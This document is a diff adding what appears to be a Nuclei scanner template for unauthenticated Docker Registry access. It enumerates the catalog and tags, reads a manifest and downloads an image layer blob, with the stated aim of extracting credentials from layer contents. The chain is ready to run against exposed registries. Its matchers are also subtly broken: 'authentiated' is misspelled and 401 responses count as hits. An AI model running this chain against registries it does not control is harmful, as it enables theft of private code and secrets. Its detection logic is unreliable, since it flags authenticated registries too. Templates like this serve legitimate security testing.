@@ -1,0 +1,77 @@
+id: custom-2026-infra-002
+info:
+  name: Docker Registry Authentication Bypass - Anonymous Layer Access
+  author: SecurityTeam
+  severity: critical
+  description: |
+    Exploits Docker Registry authentication bypass:
+    1. Docker Registry v2 API accessible without authentication
+    2. Pull arbitrary image layers
+    3. Download sensitive application code
+    4. Extract credentials from layer contents
+    5. Analyze application for vulnerabilities
+  
+  Detection method:
+    - Enumerate Docker repositories
+    - List image tags without authentication
+    - Access layer blobs
+    - Analyze layer content
+
+requests:
+  - method: GET
+    path: /v2/
+    
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"authentiated":true'
+        negative: true
+      - type: status
+        status:
+          - 200
+          - 401
+
+  - method: GET
+    path: /v2/_catalog
+    
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"repositories"'
+
+  - method: GET
+    path: /v2/{{image}}/tags/list
+    
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"tags"'
+
+  - method: GET
+    path: /v2/{{image}}/manifests/{{tag}}
+    headers:
+      Accept: "application/vnd.docker.distribution.manifest.v2+json"
+    
+    extractors:
+      - type: json
+        internal: true
+        name: blob_digest
+        json:
+          - '.layers[0].digest'
+
+  - method: GET
+    path: /v2/{{image}}/blobs/{{blob_digest}}
+    
+    matchers:
+      - type: status
+        status:
+          - 200
+
+tags:
+  - infrastructure
+  - docker
+  - registry-bypass
+  - container-security
